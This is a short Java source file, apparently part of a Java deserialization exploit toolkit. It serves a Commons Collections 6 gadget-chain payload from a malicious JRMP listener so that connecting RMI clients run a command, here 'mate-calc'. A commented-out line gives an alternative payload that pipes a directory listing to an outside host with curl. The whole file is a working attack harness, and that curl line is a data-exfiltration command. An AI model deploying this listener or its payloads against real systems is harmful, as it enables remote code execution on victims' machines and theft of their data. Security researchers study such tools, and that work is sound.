package xyz.eki.marshalexp.rmi.attack;

import xyz.eki.marshalexp.poc.CC6;
import xyz.eki.marshalexp.rmi.networking.JRMPListener;

public class AttackClientByJRMPListener {
    public static final void main ( final String[] args ) throws Exception {

        final Object payloadObject = new CC6().getPocObject("mate-calc");
        //CC6.getPayloadObject("ls / | curl -F ':data=@-' http://buptmerak.cn:5666");

        try {
            int port = 27169;
            System.out.println("* Opening JRMP listener on " + port);
            JRMPListener c = new JRMPListener(port, payloadObject);
            c.run();
        }
        catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }
}
